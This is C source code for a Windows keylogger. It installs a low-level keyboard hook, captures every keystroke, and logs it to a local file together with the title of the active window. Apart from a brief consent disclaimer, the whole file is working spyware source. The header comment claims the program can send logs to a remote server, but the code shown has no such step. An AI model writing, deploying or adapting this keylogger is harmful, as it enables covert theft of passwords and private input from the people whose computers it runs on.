/**
 * Keylogger Created by Qwerty
 * Works only on Windows
 * 
 * This program captures every keystroke typed on the system by hooking into low-level keyboard events.
 * It records the pressed keys and can save them to a log file or transmit them to a remote server.
 * This works by using Windows API functions like SetWindowsHookEx to intercept keyboard input events.
 * 
 * Use responsibly and with consent. Unauthorized use is illegal.
 * 
 * Problems
 * -> Can't get special chars
 **/

#include <stdio.h>
#include <strings.h>

// VirtalKeyToChar.h has windows.h
#include "src/VirtualKeyToChar.h"

#pragma GCC optimize("O3") // Global High Level Optimization

#define BUFFER_SIZE 2049
#define PROCESS_SIZE 256
#define DELAY 1000  // 1 sec
#define THREADS 2
#define LOG_FILE "Keylogger.log"

char *buffer = NULL;
int buffer_ptr = 0;
CRITICAL_SECTION cs;

LRESULT CALLBACK KeyboardProc(int ncode, WPARAM wparam, LPARAM lparam) {
    if (ncode >= 0 ) {
        if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
            
            KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT* ) lparam;
            // Backspace Logic
            if ((pKeyboard->vkCode == VK_BACK) && (buffer_ptr > 0)) {
                --buffer_ptr; 
                return CallNextHookEx(NULL, ncode, wparam, lparam);
            }

            char vKey = VirtualKeyToChar(pKeyboard->vkCode);
            
            if (vKey) {
                EnterCriticalSection(&cs);
                *(buffer + buffer_ptr) = vKey; 
                buffer_ptr++;
                *(buffer + buffer_ptr) = '\0';
                LeaveCriticalSection(&cs);
            }
        }        
    }
    return CallNextHookEx(NULL, ncode, wparam, lparam); // pass it to next hook
}

DWORD WINAPI ListenerProc() {
    HHOOK keyboardhook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardhook) {
        return 1;
    }


    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardhook);

    return 0;
}

HWND get_window() {
    return GetForegroundWindow();
}

void Get_time(FILE* file) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(file,"*************************************\n");
    fprintf(file, "Started on %d/%d/%d at %d:%d:%d\n", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);
    return;
}

DWORD WINAPI WriterProc() {
    char forgroundproc[PROCESS_SIZE], blacklist[] = "Task Switching", backgroundproc[PROCESS_SIZE] = { 0 };
    FILE* file = fopen(LOG_FILE, "a");
    if (!file) {
        return 1;
    }

    Get_time(file); // Writes the starting time into the file

    while (TRUE) {
        HWND hwnd = get_window();
        if (!hwnd) {
            continue;
        }
        GetWindowText(hwnd, forgroundproc, PROCESS_SIZE);

        // Writes only when the process is not same 
        if (buffer_ptr) { 
            if (strcmp(backgroundproc, forgroundproc) && strcmp(forgroundproc,blacklist)) { 

                EnterCriticalSection(&cs);
                // Write to the file 
                printf("[ %s ] : %s\n", backgroundproc, buffer);
                fflush(stdout);
                fprintf(file, "[ %s ] : %s\n", backgroundproc, buffer);
                fflush(file);
                buffer_ptr = 0; // Reset buffer pointer
                *buffer = '\0'; // Clear buffer
                strcpy(backgroundproc, forgroundproc);
                
                LeaveCriticalSection(&cs);
            }
        }
        Sleep(DELAY);
    }

    fclose(file);
    return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    buffer = (char* ) malloc(BUFFER_SIZE * sizeof(char));
    HANDLE* threads = (HANDLE* ) malloc(THREADS * sizeof(HANDLE));

    if (!buffer || !threads) {
        return 1;
    }
    
    InitializeCriticalSection(&cs);
    *threads = CreateThread(NULL, 0, &ListenerProc, NULL, 0, 0);
    *(threads + 1) = CreateThread(NULL, 0, &WriterProc, NULL, 0, 0);

    WaitForMultipleObjects(THREADS, threads, 1, INFINITE);
    free(threads);
    free(buffer);
    DeleteCriticalSection(&cs);
    return 0;
}
